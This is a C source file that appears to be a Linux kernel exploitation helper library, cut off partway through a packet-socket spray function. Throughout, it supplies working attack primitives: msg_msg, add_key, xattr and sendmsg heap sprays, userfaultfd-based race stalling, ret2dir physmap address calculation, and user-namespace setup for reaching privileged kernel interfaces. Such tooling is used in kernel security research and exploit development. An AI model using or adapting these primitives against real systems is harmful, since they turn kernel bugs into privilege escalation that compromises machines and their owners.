#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdarg.h>
#include <sched.h>
#include <time.h>
#include <poll.h>
#include <signal.h>
#include <keyutils.h>
#include <pthread.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/xattr.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <arpa/inet.h>
#include <x86intrin.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <linux/io_uring.h>

#include "libexp.h"

struct fault_struct {
	int uffd;
	struct fault_struct *next;
	void *addr;
	size_t len;
	void *src_page;
	void (*hook)(void *);
};

static u64 min_cpu_freq;
static u64 min_granularity;
static u64 min_slice_tsc;
static u64 msgmnb;
static u64 mem_size;
static u64 optmem_max;
static int urand_fd;
u64 cpu_num;
struct cpu_info *idle_cpus;
cpu_set_t cpu_mask;
size_t kmalloc_size_array[13] = {0x8, 0x10, 0x20, 0x40, 0x60, 0x80, 0xc0, 0x100, 0x200, 0x400, 0x800, 0x1000, 0x2000};

#define DEBUG 0
#define dprintf(...) if(DEBUG) printf(__VA_ARGS__)
#define PAGE_SHIFT 12
#define PAGE_SIZE (1 << PAGE_SHIFT)
#define PFN_MIN 0

#define CPU_FREQ_FILE "/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_min_freq"
#define SCHED_GRAN_FILE "/proc/sys/kernel/sched_min_granularity_ns"
#define MSGMNB_FILE "/proc/sys/kernel/msgmnb"
#define CPU_INFO_FILE "/proc/cpuinfo"
#define MEM_INFO_FILE "/proc/meminfo"
#define OPTMEM_MAX_FILE "/proc/sys/net/core/optmem_max"
#define SCHED_DEBUG_FILE "/proc/sched_debug"
#define SUPPRESS_PROC_NUM 20
#define UNIV_SPRAY_FILE "/tmp/univ_spray_dummy"

void rand_str(char *dest, size_t length)
{
	char charset[] = "0123456789"
	                 "abcdefghijklmnopqrstuvwxyz"
	                 "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	read(urand_fd, dest, length);
	for(int i=0; i<length; i++) {
		int idx = ((int)dest[i]) % (sizeof(charset)/sizeof(char) - 1);
		dest[i] = charset[idx];
	}
	dest[length] = '\0';
}

void hex_print(void *addr, size_t len)
{
	u64 tmp_addr = (u64)addr;
	puts("");
	for(u64 tmp_addr=(u64)addr; tmp_addr < (u64)addr + len; tmp_addr += 0x10) {
		printf("0x%016llx: 0x%016llx 0x%016llx\n", tmp_addr, *(u64 *)tmp_addr, *(u64 *)(tmp_addr+8));
	}
}

void error_out(const char *fmt, ...)
{
	char *buf;
	va_list ap;

	va_start(ap, fmt);
	if(vasprintf(&buf, fmt, ap) < 0) {
		perror("[error_out]");
		exit(-1);
	}
	va_end(ap);

	puts(buf);
	perror("[Reason] ");
	exit(-1);
}

static u64 _read_u64_from_file(const char *fname)
{
	FILE *f = fopen(fname, "r");
	long size = 0x100;
	char *buf = alloca(size+1);

	// read content
	if(f == NULL) error_out("fail to open %s", fname);
	if(fread(buf, 1, size, f) <= 0) error_out("fail to fread on %s", fname);
	buf[size] = 0;
	fclose(f);

	return atoll(buf);
}

static size_t kmalloc_size(size_t num)
{
	for(int i=0; i<sizeof(kmalloc_size_array)/sizeof(kmalloc_size_array[0]); i++) {
		size_t size = kmalloc_size_array[i];
		if(size > num) return size;
	}
	error_out("%ld is too large to fit in kmalloc", num);
}

static u64 _get_cpu_freq(void)
{
	// try to read from u64 first
	if(access(CPU_FREQ_FILE, R_OK) == 0)
		return _read_u64_from_file(CPU_FREQ_FILE);

	// try to read from /proc/cpuinfo
	if(access(CPU_INFO_FILE, R_OK) == 0) {
		FILE *f = fopen(CPU_INFO_FILE, "r");
		char *line_buf = NULL;
		char *freq_buf;
		size_t n;

		// look for cpu MHz
		while(!feof(f)) {
			if(getline(&line_buf, &n, f) < 0) {
				free(line_buf);
				goto out;
			}
			if(strstr(line_buf, "cpu MHz")) break;
		}

		freq_buf = strstr(line_buf, ":");
		freq_buf += 1;
		double freq = atof(freq_buf) * 1000;// MHz to KHz
		return (u64)freq;
	}

out:
	error_out("fail to get cpu frequency");
	return -1;
}

static u64 _get_min_gran(void)
{
	// try to read from file first
	if(access(SCHED_GRAN_FILE, R_OK) == 0)
		return _read_u64_from_file(SCHED_GRAN_FILE);

	// return a commonly used default value
	return 3000000;
}

static u64 _get_cpu_num(void)
{
	return sysconf(_SC_NPROCESSORS_ONLN);
}

static u64 _get_mem_size(void)
{
	FILE *f = fopen(MEM_INFO_FILE, "r");
	char *line_buf = NULL;
	char *buf;
	size_t n;

	if(unlikely(f == NULL)) error_out("fail to open /proc/meminfo");

	if(getline(&line_buf, &n, f) < 0) {
		free(line_buf);
		goto out;
	}
	buf = strstr(line_buf, ":") + 1;
	fclose(f);
	return atoll(buf) * 1024;

out:
	error_out("fail to read memory size");
	fclose(f);
	return -1;
}

static void busy_loop(void)
{
	while(1);
}

pid_t clean_fork(void)
{
	pid_t pid = fork();
	if(pid) return pid;

	if(prctl(PR_SET_PDEATHSIG, SIGKILL) < 0) error_out("fail to register DEATHSIG");
	return pid;
}

void anti_swapper(void (*hook)(void))
{
	for(int i=0; i<cpu_num; i++) {
		if(!clean_fork()) {
			set_cpu(i);
			if(hook) hook();
			busy_loop();
		}
	}
}

void suppress_int(void (*hook)(void))
{
	for(int i=0; i<cpu_num; i++) {
		// for each core spawn SUPPRESS_PROC_NUM dummy process
		for(int j=0; j<SUPPRESS_PROC_NUM; j++) {
			if(!clean_fork()) {
				set_cpu(i);
				if(hook) hook();
				busy_loop();
			}
		}
	}
}

void ts_fence(void)
{
	cpu_set_t my_set;

	// Step1: get current affinity mask
	if(sched_getaffinity(0, sizeof(my_set), &my_set)) error_out("fail to get cpu affinity");

	// Step2: pin CPU to current CPU to avoid task migration and get wrong tsc
	set_cpu(sched_getcpu());

	// Step3: do context switch detection
	register u64 start = __rdtsc();
	register u64 prev = start;
	register u64 now = start;
	while(1) {
		now = __rdtsc();
		if(unlikely(now - prev > min_slice_tsc)) break;
		if(unlikely(now - start > 5*min_slice_tsc)) {
			// puts("[Info] Have been waiting for a reschedule for too long, gonna yield and hope next time we get a new time slice");
			sched_yield();
			break;
		}
		prev = now;
	}

	// Step4: restore affinity mask
	if(sched_setaffinity(0, sizeof(my_set), &my_set)) error_out("fail to set cpu affinity");
}

void set_cpu(int cpuid)
{
	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(cpuid, &my_set);
	if(sched_setaffinity(0, sizeof(my_set), &my_set) != 0)
		error_out("set cpu affinity at cpu: %d fails", cpuid);
}

void unset_cpu(void)
{
	if(unlikely(sched_setaffinity(0, sizeof(cpu_set_t), &cpu_mask) != 0))
		error_out("fail to unset cpu affinity");
}

int write_file(const char* fname, const char* fmt, ...)
{
	char buf[1024];
	va_list args;

	va_start(args, fmt);
	vsnprintf(buf, sizeof(buf)-1, fmt, args);
	va_end(args);
	buf[sizeof(buf)-1] = 0;

	int len = strlen(buf);
	int fd = open(fname, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return -1;
	if (write(fd, buf, len) != len) {
		close(fd);
		return -1;
	}
	close(fd);
	return 0;
}


void setup_sandbox(void)
{
	int real_uid = getuid();
	int real_gid = getgid();

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWNS) != 0)
		error_out("unshare fails");
	if (write_file("/proc/self/setgroups", "deny") < 0)
		error_out("write_file(/proc/self/set_groups) fails");
	if (write_file("/proc/self/uid_map", "0 %d 1\n", real_uid) < 0)
		error_out("write_file(/proc/self/uid_map) fails");
	if (write_file("/proc/self/gid_map", "0 %d 1\n", real_gid) < 0)
		error_out("write_file(/proc/self/gid_map) fails");
}

void *umem_alloc(void *addr, size_t size)
{
	void *ret;
	int flags = MAP_SHARED | MAP_ANON;
	if (addr) flags |= MAP_FIXED;
	ret = mmap(addr, size, PROT_READ | PROT_WRITE | PROT_EXEC, flags, -1, 0);
	if(addr && ret != addr) error_out("[-] umem_alloc fails to mmap the fixed address %p", addr);
	if(!addr && !ret) error_out("[-] umem_alloc fails to mmap NULL");
	return ret;
}

/* use add_key for defragment
* add_key will allocate 5 objects in one call when the key is added for the first time
* and 4 objects afterwards
* 1. strlen(desc) and get freed eventually
* 2. plen caused by kvmalloc and get freed eventually
* 3. (struct user_key_payload) + plen, sizeof(payload)+0x18
* 4. sizeof(struct assoc_array_edit) in size of 328 (0x148), and freed if not the first time
* (5). sometimes allocate (struct assoc_array_node) twice 0x98/152
* 6. struct key, size of 0x100 -> through special cache not kmalloc
* 7. sizeof(desc), caused by kmemdup
*/
// here we use the desc method
void defragment_add_key(size_t size, u32 num)
{
	char type[] = "user";
	char *desc = alloca(size+1);
	char payload[1];

	if(num > 195) puts("num too large, defragmentation is likely to fail");

	memset(desc, 0, size+1);
	payload[0] = 'A';

	for(int i=0; i<num; i++) {
		key_serial_t key;
		rand_str(desc, size-1);
		key = add_key(type, desc, payload, sizeof(payload), KEY_SPEC_THREAD_KEYRING);
		if(key < 0) error_out("add_key failed at idx %d", i);
	}
}

void add_key_spray_num(void *payload, size_t size, u32 num)
{
	char type[] = "user";
	char desc[0x10];

	memset(desc, 0, sizeof(desc));

	for(int i=0; i<num; i++) {
		key_serial_t key;
		rand_str(desc, sizeof(desc)-1);
		key = add_key(type, desc, payload, size, KEY_SPEC_THREAD_KEYRING);
		if(key < 0) error_out("add_key failed at idx %d", i);
	}
}

// max length: 4096
void add_key_desc_spray_num(char *desc, u32 num)
{
	char type[] = "user";
	size_t size = strlen(desc);
	size_t ksize = kmalloc_size(size);
	char payload[1];

	if(num > 195) puts("num too large, defragmentation is likely to fail");
	if(ksize <= size) error_out("size too large, it should be smaller than next kmalloc size");
	if(unlikely(size) >= 4096) error_out("[-] max size of desc spray is 0x1000");

	payload[0] = 'A';

	for(int i=0; i<num; i++) {
		key_serial_t key;
		rand_str(&desc[size], ksize-size-1);
		key = add_key(type, desc, payload, sizeof(payload), KEY_SPEC_THREAD_KEYRING);
		if(key < 0) error_out("add_key failed at idx %d", i);
	}
}

static struct msg_spray_t *msg_spray_once(void *payload, size_t msg_size, u32 num)
{
	int msgqid;
	char *buf;

	// create the message queue id first
	msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	if(unlikely(msgqid < 0)) error_out("fail to create a System V message queue");

	// prepare msg buffer
	if(payload) buf = payload;
	else {
		buf = alloca(msg_size);
		memset(buf, 'A', msg_size);
	}

	// do spray
	for(int i=0; i<num; i++) {
		if(unlikely(msgsnd(msgqid, buf, msg_size, IPC_NOWAIT) < 0)) {
			error_out("msgsnd failed at idx %d", i);
		}
	}

	// return info about this spray
	struct msg_spray_t *spray = malloc(sizeof(struct msg_spray_t));
	spray->next = NULL;
	spray->msgqid = msgqid;
	spray->payload = payload;
	spray->len = msg_size;
	spray->num = num;
	return spray;
}

struct msg_spray_t *msg_spray(void *payload, size_t msg_size, u32 num)
{
	u32 max_num = msgmnb / (msg_size + 0x30);
	u32 sent = 0;
	struct msg_spray_t *spray = NULL, *tmp_spray;

	// do max number of allocation and then repeat for a new message queue
	while(num > 0) {
		u32 todo = (num >= max_num) ? max_num : num;
		tmp_spray = msg_spray_once(payload, msg_size, todo);
		sent += todo;
		num -= todo;

		// link tmp_spray
		if(!spray) spray = tmp_spray;
		else {
			tmp_spray->next = spray->next;
			spray->next = tmp_spray;
		}
	}
	return spray;
}

struct msg_spray_t *msg_spray_max(void *payload, size_t plen)
{
	size_t size = plen + 0x30;
	u32 max_num = msgmnb / size;
	return msg_spray(payload, plen, max_num);
}

void msg_spray_clean(struct msg_spray_t *spray)
{
	void *buffer = malloc(sizeof(struct msgbuf) + spray->len);
	while(spray) {
		//printf("spray->len: %d\n", spray->len);
		//printf("spray->payload: %p\n", spray->payload);
		//printf("spray->num: %d\n", spray->num);
		//printf("spray->msgqid: %d\n", spray->msgqid);
		//printf("spray->next: %p\n", spray->next);
		for(int i=0; i<spray->num; i++) {
			if (msgrcv(spray->msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT) == -1) {
				if(errno != ENOMSG) error_out("[msg_spray_clean]");
			}
		}
		if(msgctl(spray->msgqid, IPC_RMID, NULL)) error_out("fail to remove message queue");
		spray = spray->next;
	}
	//puts("clean done");
}

/* we don't want to spend extra time during defragmentation, so we should
 * allocate message queue ids ahead of time.
 * The difference shouldn't be too much though
 * each allocation takes about 3 microseconds
 * */
void defragment_msg(size_t size, u32 num)
{
	// should be equivalent with the orignal message in terms of heap usage
	size = (size <= 0x30) ? 0x31 : size;

	size_t msg_size = size - 0x30;
	u32 max_num = msgmnb / size;
	u32 sent = 0;

	msg_spray(NULL, msg_size, num);
}

void defragment(size_t size, u32 num)
{
	// we prefer msg_msg to do defragmentation because it does not
	// allocate extra objects
	if(size <= 0x20) defragment_add_key(size, num);
	else defragment_msg(size, num);
}

void xattr_spray(void *payload, size_t size, u32 num)
{
	char name[0x30];
	char fname[0x30];

	memset(name, 0, sizeof(name));

	strcpy(name, "security.");
	strcpy(fname, "/tmp/");

	for(int i=0; i<num; i++) {
		rand_str(&fname[5], 0x6);
		rand_str(&name[9], 0x6);

		int fd = open(fname, O_CREAT);
		if(fd < 0) error_out("fail to create a file for xattr spray");
		close(fd);

		int ret = setxattr(fname, name, payload, size, XATTR_CREATE);
		if (ret != 0) error_out("setxattr failure for file: %s", fname);
	}
}

void xattr_defragment(size_t size, u32 num)
{
	char name[0x30];
	char *value = malloc(size);
	char fname[0x30];

    memset(name, 0, sizeof(name));
	memset(value, 'A', size);

	strcpy(name, "security.");
	strcpy(fname, "/tmp/");

	for(int i=0; i<num; i++) {
		rand_str(&fname[5], 0x6);
		rand_str(&name[9], 0x6);

		int fd = open(fname, O_CREAT);
		if(fd < 0) error_out("fail to create a file for xattr spray");
		close(fd);

		int ret = setxattr(fname, name, value, size, XATTR_CREATE);
		if (ret != 0) error_out("setxattr failure for file: %s", fname);
	}
}

static void *fault_handling_thread(void *arg)
{
	struct uffd_msg msg;   /* Data read from userfaultfd */
	void *page = NULL;
	struct uffdio_copy uffdio_copy;
	void (*handler)(void *);
	struct pollfd pollfd;
	struct fault_struct *fault = (struct fault_struct *)arg;
	u64 addr;
	int uffd = fault->uffd;
	pthread_detach(pthread_self());

	int found = 0;

	// polling events on uffd
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	if(poll(&pollfd, 1, -1) < 0)// wait forever if no new events
		error_out("polling error");

	dprintf("\nfault_handler_thread():\n");
	dprintf("POLLIN = %d; POLLERR = %d\n",
			(pollfd.revents & POLLIN) != 0,
			(pollfd.revents & POLLERR) != 0);

	// read the pagefault message
	if(read(uffd, &msg, sizeof(msg)) <= 0)
		error_out("fail to read uffd message");

	// sanity check the event type
	if (msg.event != UFFD_EVENT_PAGEFAULT)
		error_out("unexpected event on userfaultfd handling");

	addr = msg.arg.pagefault.address;
	dprintf("    UFFD_EVENT_PAGEFAULT event: ");
	dprintf("flags = %llx; ", msg.arg.pagefault.flags);
	dprintf("address = %llx\n", addr);

	// look for registered page handler
	u64 start = (u64)fault->addr;
	if(addr >= start && addr < start + fault->len) {
		page = addr - start + fault->src_page;
		found = 1;
	}
	if(!found)
		error_out("Can't find fault handler for addr 0x%llx", msg.arg.pagefault.address);

	// call the hook
	fault->hook((void *)addr);

	// really handle the page fault
	uffdio_copy.src = (unsigned long) page;
	uffdio_copy.dst = (unsigned long) addr & ~(0x1000-1);
	uffdio_copy.len = 0x1000;
	uffdio_copy.mode = 0;
	uffdio_copy.copy = 0;
	if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
		error_out("ioctl-UFFDIO_COPY");

	// after successfully handle the page fault, sleep forever
	sleep(10000);
}

void *reg_pagefault(void *wanted, void *src_page, size_t len, void (*hook)(void *))
{
	int flags = MAP_PRIVATE | MAP_ANONYMOUS;
	void *addr;
	struct uffdio_register uffdio_register;
	pthread_t tid;
	struct uffdio_api uffdio_api;

	// initialize userfaultfd api
	int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	if(uffd < 0) error_out("fail to call userfaultfd");
	uffdio_api.api = UFFD_API;
	uffdio_api.features = 0;
	if(ioctl(uffd, UFFDIO_API, &uffdio_api) < 0)
		error_out("ioctl UFFDIO_API error");

	// map the page that needs handling
	if(wanted) flags |= MAP_FIXED;
	addr = mmap(wanted, len, PROT_READ | PROT_WRITE | PROT_EXEC, flags, -1, 0);
	if(addr < 0 || (wanted && addr != wanted)) error_out("mmap failed");

	// tell the kernel this address needs page handling
	uffdio_register.range.start = (unsigned long) addr;
	uffdio_register.range.len = len;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
		error_out("ioctl UFFDIO_REGISTER error");

	// initialize the fault_struct
	struct fault_struct *fault = malloc(sizeof(struct fault_struct));
	fault->len = len;
	fault->src_page = src_page;
	fault->addr = addr;
	fault->hook = hook;
	fault->next = NULL;
	fault->uffd = uffd;

	// launch the fault handling thread, it will be always sleeping if the api is not used
	if(pthread_create(&tid, NULL, fault_handling_thread, fault))
		error_out("fail to create page fault handling thread");

	return addr;
}

void init_pagefault(void)
{
}

/* Universal Heap Spray */
void init_univ_spray(void)
{
	// create a dummy file
	if(access(UNIV_SPRAY_FILE, F_OK) == 0) unlink(UNIV_SPRAY_FILE);
	int fd = open(UNIV_SPRAY_FILE, O_CREAT);
	if(fd < 0) error_out("fail to create a file for universal heap spray");
	close(fd);
	init_pagefault();
}

static void *univ_spray_func(void *args)
{
	void **args2 = (void **)args;
	struct spray_struct *spray = (struct spray_struct *)args2[0];
	void *addr = args2[1];

	pthread_detach(pthread_self());

	while(!spray->stage);

	syscall(__NR_setxattr, UNIV_SPRAY_FILE, "libexp", addr, spray->len, 0);

	// sleep forever
	sleep(10000);
}

struct spray_struct *prepare_univ_spray(void *payload, size_t len, u32 num, void (*hook)(void *))
{
	void *buffer = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(buffer < 0) error_out("fail to prepare for universal spray");

	// place payload at correct places
	memcpy(buffer+0x1000-len+1, payload, len-1);
	*(char *)(buffer) = ((char *)payload)[len-1];

	// create struct
	struct spray_struct *spray = malloc(sizeof(struct spray_struct));
	spray->payload = payload;
	spray->len = len;
	spray->num = num;
	spray->stage = 0;

	// register for pagefault
	for(int i=0; i<num; i++) {
		pthread_t tid;

		// map 2 pages, initialize the first page, remap the second page for page faulting
		void *addr = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		memcpy(addr, buffer, 0x1000);
		void *addr2 = reg_pagefault(addr+0x1000, buffer, 0x1000, hook);

		// start univ_spray_func thread
		void **args = malloc(sizeof(void *) * 2);
		if(!args) error_out("malloc error");
		args[0] = spray;
		args[1] = addr + 0x1000 - len + 1;
		if(pthread_create(&tid, NULL, univ_spray_func, args))
			error_out("fail to create page fault handling thread");
	}

	return spray;
}

void univ_spray(struct spray_struct *spray)
{
	spray->stage = 1;
	sched_yield();
}

void nonsense(void)
{
	char buf[0x400];
	puts("start of some fake debug message");
	printf("pid: %d\n", getpid());
	puts("start of nonsense");
	memset(buf, 0, sizeof(buf));
	for(int i=0; i<10; i++) {
		hex_print(buf, sizeof(buf));
	}
}

static void stress_add_key(size_t size)
{
	char type[] = "user";
	char *desc = alloca(size+1);
	char payload[1];
	key_serial_t keys[0x600];
	memset(desc, 0, size+1);
	payload[0] = 'A';

	// do spray
	for(int i=0; i<sizeof(keys)/sizeof(keys[0]); i++) {
		key_serial_t key;
		rand_str(desc, size-1);
		key = add_key(type, desc, payload, sizeof(payload), KEY_SPEC_THREAD_KEYRING);
		keys[i] = key;
	}

	// cleanup spray
	keyctl(KEYCTL_REVOKE, KEY_SPEC_THREAD_KEYRING);
}

static void stress_msg(size_t size)
{
	size_t msg_size = size - 0x30;
	struct msg_spray_t *spray = msg_spray(NULL, msg_size, 0x600);
	msg_spray_clean(spray);
}

static void stress_percpu_cache(int cpuid, size_t cache_size)
{
	set_cpu(cpuid);
	if(cache_size <= 0x20) stress_add_key(cache_size);
	else stress_msg(cache_size);
}

void stress_all_caches()
{
#ifdef STRESS
	for(int i=0; i<sizeof(kmalloc_size_array)/sizeof(kmalloc_size_array[0]); i++) {
		size_t cache_size = kmalloc_size_array[i];
		for(int cpuid=0; cpuid<cpu_num; cpuid++) {
			// printf("%d %lx\n", cpuid, cache_size);
			stress_percpu_cache(cpuid, cache_size);
		}
	}
#endif
}

/*reference: https://www.kernel.org/doc/Documentation/vm/pagemap.txt*/
u64 virt_to_physmap(u64 virt_addr, u64 page_offset_base)
{
	u64 pfn = 0;
	u64 kaddr = 0;
	u64 value = 0;
	u64 present = 0;

	int fd = open("/proc/self/pagemap", O_RDONLY);
	if(fd < 0) error_out("[virt_to_physmap] fail to open /proc/self/pagemap");

	// read the pagemap info about the input virtual address
	lseek(fd, (virt_addr >> PAGE_SHIFT)*sizeof(u64), SEEK_SET);
	read(fd, &value, sizeof(u64));
	// printf("pagemap: %#llx\n", value);

	// parse the value
	pfn = value & ((1UL << 55) - 1);
	present = value & (1UL << 63);
	if(present && pfn) { // if page exists and page frame exists
		kaddr = page_offset_base + PAGE_SIZE * (pfn-PFN_MIN);
	}

	close(fd);
	return kaddr;
}

int block_bit_size()
{
	int ret = 0;
	u64 val = mem_size;
	while(val > 0) {
		ret++;
		val >>= 1;
	}
	return ret+1;
}

u64 heap_to_physmap(u64 heap_ptr)
{
	int bits = 64-block_bit_size();
	u64 mask = (~(1UL << bits)) << (64-bits);
	// printf("mask: %#llx\n", mask);
	return heap_ptr & mask;
}

void *ret2dir_setup(void *src_page, u64 heap_ptr)
{
	void *kaddr = NULL;
	u64 page_offset_base = heap_to_physmap(heap_ptr);
	// printf("offset_base: %#llx\n", page_offset_base);
	u64 upper_limit = mem_size & (~(PAGE_SIZE-1));
	// printf("base: %llx\n", page_offset_base);
	// printf("mem_size: %llx\n", mem_size);
	// printf("ret: %llx\n", block_bit_size());

	// first, see whether we can directly read pagemap
	kaddr = (void *)virt_to_physmap((u64)src_page, page_offset_base);
	if(kaddr) return kaddr;

	// we don't have access to pagemap, try to spray the same page again and again
	// we use 1/2 of the memory and hope it lands in the middle of it
	// printf("mem_size: %llx\n", mem_size);
	int i = 0;
	for(i=0; i<(upper_limit/PAGE_SIZE)/2; i++) {
		void *addr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
		// printf("addr: %p\n", addr);
		memcpy(addr, src_page, PAGE_SIZE);
		// if(i%0x10 == 0) printf("i: %d, %p, %p\n", i, addr, virt_to_physmap((u64)addr, 0));
	}

	// now we calculate where our page is, it is
	// version 1: (UPPER_LIMIT - pages_allocated)/2
	kaddr = (void *)(page_offset_base + upper_limit - (i/2)*PAGE_SIZE);
	// version 2: pages_allocated/2 + 0x3000
	// kaddr = (void *)(page_offset_base + (i/2)*PAGE_SIZE) + 0x3000;

	return kaddr;
}

struct sendmsg_spray_t *prepare_sendmsg_spray(u32 fork_num, void *payload, size_t len)
{
	if(len > optmem_max) error_out("object too large!");

	// record the flag first
	int *start_flag = umem_alloc(NULL, 0x1000);
	struct sendmsg_spray_t *spray = malloc(sizeof(struct sendmsg_spray_t));
	spray->start_flag = start_flag;
	spray->ready_proc_num = start_flag+1;

	// prepare payload data
	struct cmsghdr *first;
	first = (struct cmsghdr*)payload;
	first->cmsg_len = len;
	first->cmsg_level = 0; // must be different than SOL_SOCKET=1 to "skip" cmsg
	first->cmsg_type = 0x41414141; // <---- ARBITRARY VALUE
	// hex_print(first, 0x100);

	for(int i=0; i<fork_num; i++) {
		if(!clean_fork()) {
			int ret;

			// initialize unix sockets
			int socks[2];
			ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
			if(ret) error_out("socketpair");

			// set timeout
			struct timeval tv;
			memset(&tv, 0, sizeof(tv));
			ret = setsockopt(socks[1], SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
			if(ret) error_out("setsockopt");

			// block send socket
			char buf[0x100];
			struct iovec iov = {
				.iov_base = buf,
				.iov_len = sizeof(buf),
			};
			struct msghdr mhdr;
			memset(&mhdr, 0, sizeof(mhdr));
			mhdr.msg_iov = &iov;
			mhdr.msg_iovlen = 1;
			while(sendmsg(socks[0], &mhdr, MSG_DONTWAIT) > 0);
			if(errno != EAGAIN) error_out("sendmsg does not block");

			__atomic_fetch_add(spray->ready_proc_num, 1, __ATOMIC_SEQ_CST);
			// puts("block done!");

			while(!*spray->start_flag);

			// prepare spray data
			iov.iov_len = 0x10;
			mhdr.msg_control = payload; // use the ancillary data buffer
			mhdr.msg_controllen = len;

			if(sendmsg(socks[0], &mhdr, 0) < 0) error_out("sendmsg spray error");
			error_out("sendmsg spray does not block");

			sleep(10000);
		}
	}

	// wait for all spray processes to get ready
	while(*spray->ready_proc_num != fork_num);

	return spray;
}

void sendmsg_spray(struct sendmsg_spray_t *spray)
{
	*spray->start_flag = 1;
	sched_yield();
}

void sendmsg_spray_transient(u32 num, void *payload, size_t len)
{
	if(len > optmem_max) error_out("object too large!");

	// prepare sockets
	int socks[2];
	int ret = socketpair(AF_LOCAL, SOCK_DGRAM, 0, socks);
	if(ret) error_out("socketpair");

	// prepare message
	struct msghdr mhdr;
	memset(&mhdr, 0, sizeof(mhdr));
	mhdr.msg_iovlen = 0;
	mhdr.msg_control = payload;
	mhdr.msg_controllen = len;
	mhdr.msg_name = "random"; // invalid address
	mhdr.msg_namelen = 1;

	// do it!
	for(int i=0; i<num; i++) sendmsg(socks[0], &mhdr, MSG_DONTWAIT);

	// cleanup
	close(socks[0]);
	close(socks[1]);
}

static int cpu_idle_cmp(const void *arg1, const void *arg2)
{
	struct cpu_info *info1 = (struct cpu_info *)arg1;
	struct cpu_info *info2 = (struct cpu_info *)arg2;
	return info1->nr_running - info2->nr_running;
}

static void shuffle(void *array, size_t n, size_t size)
{
	char tmp[size];
	char *arr = array;
	size_t stride = size * sizeof(char);

	srand(__rdtsc());
	if(n > 1) {
		for(size_t i=0; i<n-1; i++) {
			size_t rnd = (size_t) rand();
			size_t j = (i+rnd) % n;

			memcpy(tmp, arr + j*stride, size);
			memcpy(arr+j*stride, arr + i*stride, size);
			memcpy(arr+i*stride, tmp, size);
		}
	}
}

void reload_cpu_info(void)
{
	FILE *f = fopen(SCHED_DEBUG_FILE, "r");
	char *line = NULL;
	size_t n = 0;

	if(!f) return;

	// fill up cpu info first
	int cpuid = 0;
	while(!feof(f) && cpuid < cpu_num) {
		char *nr_running_str;
		int ret;
		ret = getline(&line, &n, f);
		if(unlikely(ret < 0)) error_out("reload_cpu_info1");

		if(strncmp(line, "cpu#", 4)) continue;

		ret = getline(&line, &n, f);
		if(unlikely(ret < 0)) error_out("reload_cpu_info2");

		nr_running_str = strstr(line, ": ");
		if(unlikely(nr_running_str == NULL)) error_out("reload_cpu_info3");
		nr_running_str += 2;

		idle_cpus[cpuid].nr_running = atoi(nr_running_str);
		idle_cpus[cpuid].cpuid = cpuid;
		cpuid++;
	}
	fclose(f);

	// shuffle and sort it according to nr_running of the CPUs
	// so that the sorted array does not favor any CPUs
	shuffle(idle_cpus, cpu_num, sizeof(*idle_cpus));
	qsort(idle_cpus, cpu_num, sizeof(*idle_cpus), cpu_idle_cmp);

	//// debug print
	//for(int i=0; i<cpu_num; i++) {
	//	printf("%d: %d\n", idle_cpus[i].cpuid, idle_cpus[i].nr_running);
	//}
}

void cleanup_msgs(void)
{
	int msgqid;
	struct msqid_ds ds;
	struct msginfo msginfo;
	int maxind = msgctl(0, MSG_INFO, (struct msqid_ds *) &msginfo);
	if(maxind < 0) error_out("[msg_info]");

	// printf("cleanup %d msgs\n", maxind);

	for(int i=0; i<maxind; i++) {
		int ret;
		msgqid = msgctl(i, MSG_STAT, &ds);
		if(msgqid < 0) continue;
		ret = msgctl(msgqid, IPC_RMID, 0);
		if(ret < 0) error_out("[msg_rmdi]");
	}
}

u64 _safe_read_u64_from_file(char *fname, u64 def_val)
{
	if(access(fname, R_OK)) return def_val;
	return _read_u64_from_file(fname);
}

int pg_vec_spray(void *src_buf, u32 buf_size, u32 num)
{
	if((buf_size & 0xfff) != 0) error_out("[pg_vec_spray] buf_size");

	// remember to run everything in sandbox
	int s = socket(AF_PACKET, SOCK_RAW|SOCK_CLOEXEC, htons(ETH_P_ALL));
	if(s < 0) error_out("[pg_vec_spray] socket");

	struct tpacket_req req;
	req.tp_block_size = buf_size;
	req.tp_block_nr = num;// spray times
	req.tp_frame_size = buf_size;
	req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
	int ret = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if(ret < 0) error_out("[pg_vec_spray] setsockopt");

	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ARP);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;
